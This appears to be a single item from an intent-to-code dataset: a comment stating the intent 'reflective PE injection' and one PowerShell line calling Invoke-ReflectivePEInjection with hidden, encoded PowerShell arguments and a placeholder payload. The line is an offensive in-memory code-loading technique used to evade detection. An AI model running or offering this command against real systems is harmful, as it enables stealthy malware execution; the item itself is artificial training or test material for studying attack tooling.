# Natural language intent:
# Perform reflective PE injection using specified PE bytes and execution arguments.

Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs '-NoP -sta -w 1 -enc <base64 encoded powershell command>'
